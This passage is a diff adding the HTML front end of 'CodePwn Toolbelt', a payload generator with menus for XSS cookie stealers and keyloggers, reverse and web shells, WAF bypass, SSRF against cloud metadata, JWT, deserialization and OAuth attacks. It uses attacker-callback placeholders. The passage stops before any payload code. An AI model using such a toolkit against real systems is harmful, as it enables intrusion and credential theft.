@@ -1,0 +1,2784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodePwn Toolbelt v0.1</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
+    <style>
+        /* CSS Variables for Theming */
+        :root {
+            --color-primary-dark: #39ff14; /* Neon Green */
+            --color-primary-light: #008000; /* Dark Green */
+            --color-bg-dark: #0d1117;    /* GitHub Dark Dimmed BG */
+            --color-bg-light: #ffffff;   /* White BG */
+            --color-text-dark: #c9d1d9;  /* GitHub Dark Dimmed Text */
+            --color-text-light: #24292f;  /* GitHub Light Text */
+            --color-border-dark: #30363d;
+            --color-border-light: #d0d7de;
+            --color-accent-dark: #58a6ff; /* GitHub Blue */
+            --color-accent-light: #0969da;
+            --color-danger-dark: #f85149; /* GitHub Red */
+            --color-danger-light: #cf222e;
+            --color-warning-dark: #d29922; /* GitHub Yellow */
+            --color-warning-light: #9a6700;
+            --color-success-dark: #3fb950; /* GitHub Green */
+            --color-success-light: #1a7f37;
+
+            --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            --font-sans: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
+
+            /* Component Styles */
+            --tab-bg-dark: #161b22;
+            --tab-bg-light: #f6f8fa;
+            --input-bg-dark: #0d1117;
+            --input-bg-light: #ffffff;
+            --bg-input-dark: #0d1117;
+            --bg-input-light: #ffffff;
+            --pre-bg-dark: #161b22;
+            --pre-bg-light: #f6f8fa;
+            --button-bg-dark: var(--color-success-dark);
+            --button-text-dark: #ffffff;
+            --button-hover-bg-dark: #2ea043;
+            --button-bg-light: var(--color-success-light);
+            --button-text-light: #ffffff;
+            --button-hover-bg-light: #156f2b;
+        }
+
+        body {
+            font-family: var(--font-sans);
+            background-color: var(--color-bg-dark);
+            color: var(--color-text-dark);
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+        body.light-theme {
+            background-color: var(--color-bg-light);
+            color: var(--color-text-light);
+        }
+
+        /* Utility Classes using CSS Variables */
+        .bg-primary { background-color: var(--color-primary-dark); }
+        .text-primary { color: var(--color-primary-dark); }
+        .border-primary { border-color: var(--color-primary-dark); }
+        .bg-accent { background-color: var(--color-accent-dark); }
+        .text-accent { color: var(--color-accent-dark); }
+        .text-danger { color: var(--color-danger-dark); }
+        .text-warning { color: var(--color-warning-dark); }
+        .text-success { color: var(--color-success-dark); }
+        .border-default { border-color: var(--color-border-dark); }
+        .bg-tab { background-color: var(--tab-bg-dark); }
+        .bg-input { background-color: var(--input-bg-dark); }
+        .bg-pre { background-color: var(--pre-bg-dark); }
+        .btn {
+            background-color: var(--button-bg-dark);
+            color: var(--button-text-dark);
+            border: 1px solid var(--color-border-dark);
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn:hover { background-color: var(--button-hover-bg-dark); }
+        .btn-secondary {
+             background-color: #21262d; /* GitHub Secondary Button Dark */
+             color: var(--color-text-dark);
+             border-color: rgba(240, 246, 252, 0.1);
+        }
+         .btn-secondary:hover {
+             background-color: #30363d;
+             border-color: #8b949e;
+         }
+         .btn-danger {
+             background-color: transparent;
+             color: var(--color-danger-dark);
+             border-color: var(--color-danger-dark);
+         }
+         .btn-danger:hover {
+             background-color: rgba(248, 81, 73, 0.1);
+             border-color: var(--color-danger-dark);
+         }
+
+
+        body.light-theme .bg-primary { background-color: var(--color-primary-light); }
+        body.light-theme .text-primary { color: var(--color-primary-light); }
+        body.light-theme .border-primary { border-color: var(--color-primary-light); }
+        body.light-theme .bg-accent { background-color: var(--color-accent-light); }
+        body.light-theme .text-accent { color: var(--color-accent-light); }
+        body.light-theme .text-danger { color: var(--color-danger-light); }
+        body.light-theme .text-warning { color: var(--color-warning-light); }
+        body.light-theme .text-success { color: var(--color-success-light); }
+        body.light-theme .border-default { border-color: var(--color-border-light); }
+        body.light-theme .bg-tab { background-color: var(--tab-bg-light); }
+        body.light-theme .bg-input { background-color: var(--input-bg-light); }
+        body.light-theme .bg-pre { background-color: var(--pre-bg-light); }
+        body.light-theme .btn {
+            background-color: var(--button-bg-light);
+            color: var(--button-text-light);
+            border-color: rgba(36, 41, 47, 0.15);
+        }
+        body.light-theme .btn:hover { background-color: var(--button-hover-bg-light); }
+         body.light-theme .btn-secondary {
+             background-color: #f6f8fa; /* GitHub Secondary Button Light */
+             color: var(--color-text-light);
+             border-color: rgba(27, 31, 36, 0.15);
+         }
+         body.light-theme .btn-secondary:hover {
+             background-color: #f3f4f6;
+             border-color: rgba(27, 31, 36, 0.15);
+         }
+         body.light-theme .btn-danger {
+             color: var(--color-danger-light);
+             border-color: var(--color-danger-light);
+         }
+         body.light-theme .btn-danger:hover {
+             background-color: rgba(207, 34, 46, 0.1);
+         }
+
+
+        /* Input/Select Styling */
+        select, input[type="text"], textarea {
+            border-radius: 6px;
+            padding: 0.5rem 0.75rem;
+            font-family: var(--font-mono);
+            line-height: 1.25rem;
+            width: 100%;
+            border: 1px solid; /* Use border-default class */
+        }
+        select:focus, input[type="text"]:focus, textarea:focus {
+            outline: 2px solid transparent;
+            outline-offset: 2px;
+            border-color: var(--color-accent-dark); /* Use accent for focus */
+            box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3); /* Accent focus ring */
+        }
+        body.light-theme select:focus,
+        body.light-theme input[type="text"]:focus,
+        body.light-theme textarea:focus {
+             border-color: var(--color-accent-light);
+             box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3);
+        }
+
+
+        /* Tab Styling */
+        .tab {
+            border-radius: 6px;
+            padding: 1rem; /* Increased padding */
+            margin-bottom: 1.5rem; /* Increased margin */
+            border: 1px solid; /* Use border-default class */
+        }
+
+        /* Pre Styling */
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            border-radius: 6px;
+            padding: 0.75rem; /* Increased padding */
+            font-family: var(--font-mono);
+            font-size: 0.875rem;
+            line-height: 1.4;
+            border: 1px solid; /* Use border-default class */
+        }
+        pre.clickable {
+             cursor: pointer;
+             transition: background-color 0.2s ease;
+        }
+        pre.clickable:hover {
+            background-color: rgba(139, 148, 158, 0.1); /* Subtle hover */
+        }
+
+        /* Matrix Effect */
+        .matrix {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; opacity: 0.15; pointer-events: none;
+        }
+        body.light-theme .matrix { opacity: 0.15; }
+
+        /* Title Pulse */
+        .pulse { animation: pulse 3s infinite ease-in-out; }
+        @keyframes pulse {
+            0%, 100% { text-shadow: 0 0 4px var(--color-primary-dark), 0 0 8px var(--color-primary-dark); }
+            50% { text-shadow: 0 0 8px var(--color-primary-dark), 0 0 16px var(--color-primary-dark); }
+        }
+        body.light-theme .pulse { animation: none; text-shadow: none; }
+
+        /* Custom Scrollbar (Optional) */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #555; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #777; }
+        body.light-theme ::-webkit-scrollbar-thumb { background: #ccc; }
+        body.light-theme ::-webkit-scrollbar-thumb:hover { background: #aaa; }
+
+    </style>
+</head>
+<body class="p-4 md:p-6 lg:p-8">
+    <canvas id="matrix" class="matrix"></canvas>
+    <div class="max-w-screen-xl mx-auto"> <!-- Wider max width -->
+        <!-- Header -->
+        <header class="flex flex-col sm:flex-row justify-between items-center mb-8 pb-4 border-b border-default">
+            <h1 class="text-3xl md:text-4xl font-bold text-primary pulse mb-4 sm:mb-0">CodePwn Toolbelt v0.1</h1>
+            <div class="flex space-x-2">
+                <button onclick="copyAll()" class="btn btn-secondary text-sm">Export All</button>
+                <label class="btn btn-secondary text-sm cursor-pointer">
+                    Import JSON
+                    <input type="file" id="import-file" accept=".json" onchange="importTools(event)" style="display: none;">
+                </label>
+                <button id="theme-toggle-button" onclick="toggleTheme()" class="btn btn-secondary text-sm px-3">🌙</button>
+            </div>
+        </header>
+
+        <!-- Disclaimer -->
+        <div class="mb-6 p-3 border border-dashed border-warning rounded-md text-warning text-sm bg-opacity-10 bg-warning">
+            <strong>Disclaimer:</strong> This tool is for educational purposes and authorized security testing only. Use responsibly and ethically. Unauthorized use is illegal. Payloads require context and understanding.
+        </div>
+
+        <!-- Main Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+
+            <!-- XSS Arsenal -->
+            <div class="tab bg-tab border-default">
+                <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">XSS Arsenal</h3>
+                <div class="space-y-4">
+                    <select id="xss_context" class="bg-input border-default">
+                        <option value="html">HTML Context</option>
+                        <option value="attribute">Attribute Context</option>
+                        <option value="javascript">JavaScript Context</option>
+                        <option value="css">CSS Context</option>
+                        <option value="url">URL Context</option>
+                        <option value="dom">DOM Injection</option>
+                    </select>
+                    <select id="xss_target" class="bg-input border-default">
+                        <option value="basic">Basic PoC (alert)</option>
+                        <option value="cookie">Cookie Stealer</option>
+                        <option value="keylogger">Keylogger</option>
+                        <option value="webcam">Webcam Access (PoC)</option>
+                        <option value="localstorage">LocalStorage Theft</option>
+                        <option value="phishing">Credential Phishing (PoC)</option>
+                    </select>
+                    <input type="text" id="xss_callback" placeholder="Callback URL (e.g., https://attacker.com/c)" class="bg-input border-default">
+                    <div class="grid grid-cols-2 gap-2">
+                        <button onclick="generateXSS()" class="btn w-full">Generate</button>
+                        <button onclick="copyXSS()" class="btn btn-secondary w-full">Copy All</button>
+                    </div>
+                    <div id="xss_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- WAF Bypass Kit -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">WAF Bypass</h3>
+                 <div class="space-y-4">
+                    <select id="waf_type" class="bg-input border-default">
+                        <option value="cloudflare">Cloudflare</option>
+                        <option value="akamai">Akamai</option>
+                        <option value="f5">F5 ASM/BigIP</option>
+                        <option value="imperva">Imperva/Incapsula</option>
+                        <option value="aws">AWS WAF</option>
+                        <option value="modsecurity">ModSecurity</option>
+                        <option value="generic">Generic/Unknown</option>
+                    </select>
+                    <select id="waf_payload_type" class="bg-input border-default">
+                        <option value="xss">XSS Bypasses</option>
+                        <option value="sqli">SQL Injection</option>
+                        <option value="cmdi">Command Injection</option>
+                        <option value="path">Path Traversal</option>
+                        <option value="xxe">XXE Injection</option>
+                    </select>
+                    <input type="text" id="waf_sample" placeholder="Sample blocked payload (optional)" class="bg-input border-default">
+                    <button onclick="generateWAFBypass()" class="btn w-full">Generate Bypasses</button>
+                    <div id="waf_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- Polyglot Payloads -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">Polyglot Payloads</h3>
+                 <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block font-medium mb-1 text-sm">Technologies</label>
+                            <div class="grid grid-cols-2 gap-1 text-sm">
+                                <label class="flex items-center"><input type="checkbox" class="polyglot-tech form-checkbox mr-2" value="html" checked> HTML</label>
+                                <label class="flex items-center"><input type="checkbox" class="polyglot-tech form-checkbox mr-2" value="js" checked> JS</label>
+                                <label class="flex items-center"><input type="checkbox" class="polyglot-tech form-checkbox mr-2" value="svg"> SVG</label>
+                                <label class="flex items-center"><input type="checkbox" class="polyglot-tech form-checkbox mr-2" value="css"> CSS</label>
+                                <label class="flex items-center"><input type="checkbox" class="polyglot-tech form-checkbox mr-2" value="xml"> XML</label>
+                                <label class="flex items-center"><input type="checkbox" class="polyglot-tech form-checkbox mr-2" value="markdown"> MD</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label for="polyglot_action" class="block font-medium mb-1 text-sm">Action</label>
+                            <select id="polyglot_action" class="bg-input border-default">
+                                <option value="alert">Basic Alert/PoC</option>
+                                <option value="fetch">Data Exfiltration</option>
+                                <option value="redirect">Page Redirect</option>
+                                <option value="defacement">Page Defacement (PoC)</option>
+                                <option value="iframe">Hidden iframe (PoC)</option>
+                            </select>
+                        </div>
+                    </div>
+                    <input type="text" id="polyglot_params" placeholder="Action parameters (e.g. callback URL)" class="bg-input border-default">
+                    <button onclick="generatePolyglot()" class="btn w-full">Generate Polyglot</button>
+                    <div id="polyglot_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- Shell Generator -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">Shell Generator</h3>
+                 <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-2">
+                        <select id="shell_type" class="bg-input border-default">
+                            <option value="reverse">Reverse Shell</option>
+                            <option value="bind">Bind Shell</option>
+                            <option value="web">Web Shell</option>
+                            <option value="meterpreter">Meterpreter (msfvenom)</option>
+                            <option value="encoded">Encoded Shell</option>
+                            <option value="fileless">Fileless Shell</option>
+                        </select>
+                        <select id="shell_language" class="bg-input border-default">
+                            <option value="bash">Bash</option>
+                            <option value="powershell">PowerShell</option>
+                            <option value="python">Python</option>
+                            <option value="perl">Perl</option>
+                            <option value="php">PHP</option>
+                            <option value="ruby">Ruby</option>
+                            <option value="java">Java</option>
+                            <option value="csharp">C#</option>
+                            <option value="go">Go</option>
+                            <option value="nc">Netcat</option>
+                            <option value="socat">Socat</option>
+                            <option value="awk">AWK</option>
+                            <option value="windows">Windows (Generic)</option>
+                            <option value="linux">Linux (Generic)</option>
+                        </select>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2">
+                        <input type="text" id="shell_ip" placeholder="Attacker IP (LHOST)" class="bg-input border-default">
+                        <input type="text" id="shell_port" placeholder="Attacker Port (LPORT)" class="bg-input border-default">
+                    </div>
+                    <div class="grid grid-cols-2 gap-2 text-sm">
+                        <label class="flex items-center"><input type="checkbox" id="shell_obfuscate" class="form-checkbox mr-2"> Obfuscate/Encode</label>
+                        <label class="flex items-center"><input type="checkbox" id="shell_stage" class="form-checkbox mr-2"> Staged Payload</label>
+                    </div>
+                    <button onclick="generateShell()" class="btn w-full">Generate Shell</button>
+                    <div id="shell_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- SSRF Toolkit -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">SSRF Toolkit</h3>
+                 <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-2">
+                        <select id="ssrf_env" class="bg-input border-default">
+                            <option value="aws">AWS Metadata</option>
+                            <option value="gcp">GCP Metadata</option>
+                            <option value="azure">Azure Metadata</option>
+                            <option value="digitalocean">DigitalOcean Metadata</option>
+                            <option value="docker">Docker API</option>
+                            <option value="kubernetes">Kubernetes API</option>
+                            <option value="etcd">etcd API</option>
+                            <option value="redis">Redis</option>
+                            <option value="elasticsearch">Elasticsearch</option>
+                            <option value="internal">Internal Services Scan</option>
+                            <option value="custom">Custom Target</option>
+                        </select>
+                        <select id="ssrf_technique" class="bg-input border-default">
+                            <option value="standard">Standard URL</option>
+                            <option value="ip_encode">IP Encoding Bypass</option>
+                            <option value="dns_rebind">DNS Rebinding Hints</option>
+                            <option value="protocol">Protocol Handlers</option>
+                            <option value="redirect">Open Redirect Chain</option>
+                            <option value="filter_bypass">Common Filter Bypasses</option>
+                        </select>
+                    </div>
+                    <input type="text" id="ssrf_target" placeholder="Target IP/Hostname (if custom/internal)" class="bg-input border-default">
+                    <button onclick="generateSSRF()" class="btn w-full">Generate Payloads</button>
+                    <div id="ssrf_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- JWT Toolkit -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">JWT Toolkit</h3>
+                 <div class="space-y-4">
+                    <textarea id="jwt_token" placeholder="Paste JWT token here" class="bg-input border-default h-28"></textarea>
+                    <div class="grid grid-cols-3 gap-2">
+                        <button onclick="decodeJWT()" class="btn btn-secondary w-full">Decode</button>
+                        <button onclick="analyzeJWT()" class="btn btn-secondary w-full">Analyze</button>
+                        <button onclick="tamperedJWT()" class="btn w-full">Generate Attacks</button>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2">
+                        <input type="text" id="jwt_key" placeholder="Secret/Key (for signing/verify)" class="bg-input border-default">
+                        <select id="jwt_attack" class="bg-input border-default">
+                            <option value="alg_none">alg:none Attack</option>
+                            <option value="kid_inject">kid Injection</option>
+                            <option value="jwk_inject">jwk Injection (Self-Signed)</option>
+                            <option value="jku_inject">jku Injection (External JWKS)</option>
+                            <option value="x5u_inject">x5u Injection (External Cert)</option>
+                            <option value="signature_bypass">Signature Bypass Techniques</option>
+                            <option value="payload_tamper">Payload Tampering (e.g., role)</option>
+                        </select>
+                    </div>
+                    <div id="jwt_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- Deserialization Payloads -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">Deserialization</h3>
+                 <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-2">
+                        <select id="deser_language" class="bg-input border-default">
+                            <option value="java">Java (ysoserial)</option>
+                            <option value="php">PHP (phpggc)</option>
+                            <option value="dotnet">ASP.NET (ysoserial.net)</option>
+                            <option value="python">Python (pickle)</option>
+                            <option value="ruby">Ruby (marshal)</option>
+                            <option value="nodejs">Node.js (node-serialize)</option>
+                            <option value="yaml">YAML (PyYAML/Ruby)</option>
+                        </select>
+                        <select id="deser_gadget" class="bg-input border-default">
+                            <option value="rce">Remote Code Execution</option>
+                            <option value="ssrf">SSRF (DNS Check)</option>
+                            <option value="filewrite">File Write</option>
+                            <option value="fileread">File Read</option>
+                            <option value="dos">DoS Attack</option>
+                        </select>
+                    </div>
+                    <input type="text" id="deser_command" placeholder="Command/URL/File Path/Payload" class="bg-input border-default">
+                    <button onclick="generateDeserialization()" class="btn w-full">Generate Payload Command</button>
+                    <div id="deser_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- OAuth 2.0 Exploiter -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">OAuth 2.0 Exploiter</h3>
+                 <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-2">
+                        <input type="text" id="oauth_client_id" placeholder="Client ID" class="bg-input border-default">
+                        <input type="text" id="oauth_redirect_uri" placeholder="Registered Redirect URI" class="bg-input border-default">
+                    </div>
+                    <input type="text" id="oauth_auth_url" placeholder="Authorization URL" class="bg-input border-default">
+                    <select id="oauth_attack" class="w-full bg-input border-default">
+                        <option value="redirect_uri">Redirect URI Manipulation</option>
+                        <option value="state">CSRF/State Parameter Bypass</option>
+                        <option value="scope">Scope Escalation/Manipulation</option>
+                        <option value="response_type">Response Type Switching</option>
+                        <option value="open_redirect">Open Redirect Chain</option>
+                        <option value="implicit_flow">Implicit Flow Abuse (Token Leak)</option>
+                    </select>
+                    <input type="text" id="oauth_attacker_uri" placeholder="Attacker Controlled URI" class="bg-input border-default">
+                    <button onclick="generateOAuthExploit()" class="btn w-full">Generate Attack URLs</button>
+                    <div id="oauth_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- GraphQL Exploitation -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">GraphQL Exploiter</h3>
+                 <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-2">
+                        <input type="text" id="graphql_endpoint" placeholder="GraphQL Endpoint URL" class="bg-input border-default">
+                        <select id="graphql_attack" class="bg-input border-default">
+                            <option value="introspection">Introspection Query</option>
+                            <option value="dos_alias">DoS (Alias Overloading)</option>
+                            <option value="dos_depth">DoS (Deep Recursion)</option>
+                            <option value="batch_query">Batch Query Example</option>
+                            <option value="field_suggestion">Field Suggestion</option>
+                            <option value="sensitive_query">Example Sensitive Query</option>
+                        </select>
+                    </div>
+                    <textarea id="graphql_schema" placeholder="Schema (optional, helps tailor attacks)" class="bg-input border-default h-24"></textarea>
+                    <button onclick="generateGraphQLAttack()" class="btn w-full">Generate Queries</button>
+                    <div id="graphql_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+            <!-- SSTI -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">SSTI Detector/Exploiter</h3>
+                 <div class="space-y-4">
+                     <select id="ssti_engine" class="bg-input border-default">
+                         <option value="generic">Generic Detection</option>
+                         <option value="jinja2">Jinja2 (Python/Flask)</option>
+                         <option value="twig">Twig (PHP/Symfony)</option>
+                         <option value="freemarker">FreeMarker (Java)</option>
+                         <option value="velocity">Velocity (Java)</option>
+                         <option value="erb">ERB (Ruby)</option>
+                         <option value="handlebars">Handlebars (Node.js)</option>
+                         <option value="tornado">Tornado (Python)</option>
+                     </select>
+                     <input type="text" id="ssti_command" placeholder="RCE Command (e.g., id, whoami)" class="bg-input border-default">
+                     <button onclick="generateSSTI()" class="btn w-full">Generate Payloads</button>
+                     <div id="ssti_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                 </div>
+            </div>
+
+            <!-- Request Smuggling -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">HTTP Request Smuggling</h3>
+                 <div class="space-y-4">
+                     <select id="smuggling_type" class="bg-input border-default">
+                         <option value="cl_te">CL.TE (Frontend CL, Backend TE)</option>
+                         <option value="te_cl">TE.CL (Frontend TE, Backend CL)</option>
+                         <option value="te_te">TE.TE (TE -> TE Obfuscation)</option>
+                     </select>
+                     <input type="text" id="smuggling_host" placeholder="Target Host Header (e.g., example.com)" class="bg-input border-default">
+                     <textarea id="smuggling_prefix" placeholder="Request Prefix (e.g., GET / HTTP/1.1)" class="bg-input border-default h-20"></textarea>
+                     <textarea id="smuggling_smuggled" placeholder="Smuggled Request (e.g., GET /admin HTTP/1.1)" class="bg-input border-default h-20"></textarea>
+                     <button onclick="generateSmuggling()" class="btn w-full">Generate Request Template</button>
+                     <div id="smuggling_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                 </div>
+            </div>
+
+             <!-- Prototype Pollution -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">Prototype Pollution</h3>
+                 <div class="space-y-4">
+                     <select id="pp_technique" class="bg-input border-default">
+                         <option value="basic_object">Basic Object Pollution</option>
+                         <option value="constructor">Via Constructor</option>
+                         <option value="url_param">Via URL Parameter (Example)</option>
+                         <option value="json_parse">Via JSON.parse (Contextual)</option>
+                     </select>
+                     <input type="text" id="pp_property" placeholder="Property to Pollute (e.g., isAdmin)" class="bg-input border-default">
+                     <input type="text" id="pp_value" placeholder="Value (e.g., true)" class="bg-input border-default">
+                     <button onclick="generatePollution()" class="btn w-full">Generate Examples</button>
+                     <div id="pp_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                 </div>
+            </div>
+
+             <!-- Blind SQLi Helper -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">Blind SQLi Helper</h3>
+                 <div class="space-y-4">
+                     <select id="bsqli_type" class="bg-input border-default">
+                         <option value="boolean">Boolean-Based</option>
+                         <option value="time">Time-Based</option>
+                     </select>
+                      <select id="bsqli_db" class="bg-input border-default">
+                         <option value="mysql">MySQL</option>
+                         <option value="postgres">PostgreSQL</option>
+                         <option value="mssql">MSSQL</option>
+                         <option value="oracle">Oracle</option>
+                         <option value="sqlite">SQLite</option>
+                     </select>
+                     <input type="text" id="bsqli_query" placeholder="Subquery (e.g., SELECT @@version)" class="bg-input border-default">
+                     <input type="number" id="bsqli_sleep" placeholder="Sleep Time (sec)" value="5" class="bg-input border-default">
+                     <button onclick="generateBlindSQLi()" class="btn w-full">Generate Structures</button>
+                     <div id="bsqli_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                 </div>
+            </div>
+
+            <!-- CVE Lookup -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">CVE PoC Lookup</h3>
+                 <div class="space-y-4">
+                     <input type="text" id="cve_id" placeholder="Enter CVE ID (e.g., CVE-2023-1234)" class="bg-input border-default">
+                     <button onclick="lookupCVE()" class="btn w-full">Generate Search Links</button>
+                     <div id="cve_output" class="p-3 rounded-md overflow-auto max-h-96 text-sm space-y-2">
+                         <!-- Links will appear here -->
+                     </div>
+                 </div>
+            </div>
+
+            <!-- Pattern Extractor -->
+            <div class="tab bg-tab border-default">
+                 <h3 class="text-xl font-semibold mb-4 border-b border-default pb-2">Pattern Extractor</h3>
+                 <div class="space-y-4">
+                    <textarea id="extractor_input" placeholder="Paste text to analyze (logs, source code, configs, etc.)" class="bg-input border-default h-32"></textarea>
+                    <div class="grid grid-cols-3 gap-2">
+                        <button onclick="extractPatterns('secrets')" class="btn btn-secondary w-full text-sm">API Keys</button>
+                        <button onclick="extractPatterns('cloud')" class="btn btn-secondary w-full text-sm">Cloud</button>
+                        <button onclick="extractPatterns('tokens')" class="btn btn-secondary w-full text-sm">Tokens</button>
+                        <button onclick="extractPatterns('ips')" class="btn btn-secondary w-full text-sm">IPs/Domains</button>
+                        <button onclick="extractPatterns('emails')" class="btn btn-secondary w-full text-sm">Emails</button>
+                        <button onclick="extractPatterns('custom')" class="btn btn-secondary w-full text-sm">Custom</button>
+                    </div>
+                    <input type="text" id="extractor_regex" placeholder="Custom regex pattern (e.g., user_[a-zA-Z0-9]+)" class="bg-input border-default">
+                    <div id="extractor_output" class="bg-pre border-default p-3 rounded-md overflow-auto max-h-96 text-sm"></div>
+                </div>
+            </div>
+
+        </div>
+
+        <footer class="mt-12 pt-4 text-center text-xs border-t border-default text-gray-500">
+            CodePwn Toolbelt v1.0 - Use Responsibly & Ethically
+        </footer>
+    </div>
+
+    <script>
+        // Global state
+        let currentXssPayloads = [];
+        let exportableContent = {};
+        let matrixInterval;
+
+        // --- Matrix Effect ---
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz@%*~+-=[]{}()';
+        let columns = 0;
+        let drops = [];
+
+        function setupMatrix() {
+            if (!canvas) return;
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            columns = Math.max(1, Math.floor(canvas.width / 12));
+            drops = Array(columns).fill(1);
+        }
+
+        function drawMatrix() {
+            try {
+                if (!ctx || canvas.width <= 0 || canvas.height <= 0) return;
+                ctx.fillStyle = document.body.classList.contains('light-theme') ? 'rgba(255, 255, 255, 0.05)' : 'rgba(13, 17, 23, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = document.body.classList.contains('light-theme') ? getComputedStyle(document.documentElement).getPropertyValue('--color-primary-light').trim() : getComputedStyle(document.documentElement).getPropertyValue('--color-primary-dark').trim();
+                ctx.font = '12px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const text = characters[Math.floor(Math.random() * characters.length)];
+                    ctx.fillText(text, i * 12, drops[i] * 12);
+                    if (drops[i] * 12 > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            } catch (e) {
+                console.error("Error in drawMatrix:", e);
+                stopMatrix();
+            }
+        }
+        function startMatrix() {
+            if (!matrixInterval && canvas && canvas.width > 0 && canvas.height > 0) {
+                setupMatrix(); // Ensure setup before starting
+                matrixInterval = setInterval(drawMatrix, 60); // Slightly slower
+            }
+        }
+        function stopMatrix() {
+             if (matrixInterval) { clearInterval(matrixInterval); matrixInterval = null; }
+        }
+
+        // --- Utilities ---
+        async function copyToClipboard(text) {
+            if (!text) { showToast('Nothing to copy!'); return false; }
+            try { await navigator.clipboard.writeText(text); showToast('Copied!'); return true; }
+            catch (err) { console.error('Clipboard API failed:', err); try { const ta = document.createElement("textarea"); ta.value = text; ta.style.position = "fixed"; ta.style.left = "-9999px"; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); showToast('Copied (fallback)!'); return true; } catch (fbErr) { console.error('Fallback copy failed:', fbErr); showToast('Copy failed!'); return false; } }
+        }
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = 'fixed bottom-4 right-4 px-4 py-2 rounded-md shadow-lg z-50 text-sm font-medium';
+            const isLight = document.body.classList.contains('light-theme');
+            toast.style.backgroundColor = isLight ? getComputedStyle(document.documentElement).getPropertyValue('--button-bg-light').trim() : getComputedStyle(document.documentElement).getPropertyValue('--button-bg-dark').trim();
+            toast.style.color = isLight ? getComputedStyle(document.documentElement).getPropertyValue('--button-text-light').trim() : getComputedStyle(document.documentElement).getPropertyValue('--button-text-dark').trim();
